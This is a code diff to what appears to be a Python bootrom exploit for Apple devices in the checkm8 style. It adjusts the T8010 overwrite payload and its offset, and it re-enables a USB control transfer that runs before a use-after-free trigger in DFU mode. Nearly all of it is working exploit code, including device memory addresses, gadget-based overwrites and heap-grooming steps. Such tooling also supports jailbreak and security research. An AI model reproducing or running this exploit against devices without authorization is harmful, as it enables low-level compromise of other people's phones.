@@ -586,7 +586,7 @@ def all_exploit_configs():
     s5l895xx_overwrite = struct.pack('<20xI4x', 0x10000000)
     t800x_overwrite = struct.pack('<20xI4x', 0x48818000)
     s5l8960x_overwrite = struct.pack('<32xQ8x', 0x180380000)
-    t8010_overwrite = struct.pack('<32x2Q16x32x2QI', t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800,
+    t8010_overwrite = b'\0' * 0x580 + struct.pack('<32x2Q16x32x2QI', t8010_nop_gadget, 0x1800B0800, t8010_nop_gadget, 0x1800B0800,
                                   0xbeefbeef)
     t8011_overwrite = struct.pack('<32x2Q16x32x2QI', t8011_nop_gadget, 0x1800B0800, t8011_nop_gadget, 0x1800B0800,
                                   0xbeefbeef)
@@ -606,7 +606,7 @@ def all_exploit_configs():
         # T8002 (DFU loop)  NEW: 1.27 seconds
         DeviceConfig('iBoot-2651.0.0.3.3', 0x8004, None, t800x_overwrite, 0x5C0, 5, 1),
         # T8004 (buttons)   NEW: 1.06 seconds
-        DeviceConfig('iBoot-2696.0.0.1.33', 0x8010, None, t8010_overwrite, 0x580, 5, 1),
+        DeviceConfig('iBoot-2696.0.0.1.33', 0x8010, None, t8010_overwrite, 0, 5, 1),
         # T8010 (buttons)   NEW: 0.68 seconds
         DeviceConfig('iBoot-3135.0.0.2.3', 0x8011, None, t8011_overwrite, 0x500, 6, 1),
         # T8011 (buttons)   NEW: 0.87 seconds
@@ -660,7 +660,8 @@ def exploit(match=None):
 
     # Advance buffer offset before triggering the UaF to prevent trashing the heap
     #libusb1_no_error_ctrl_transfer(device, 0, 0, 0, 0, b'A' * config.overwrite_offset, 10)
-    #libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
+    
+    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
     dfu.release_device(device)
 
     time.sleep(0.5)
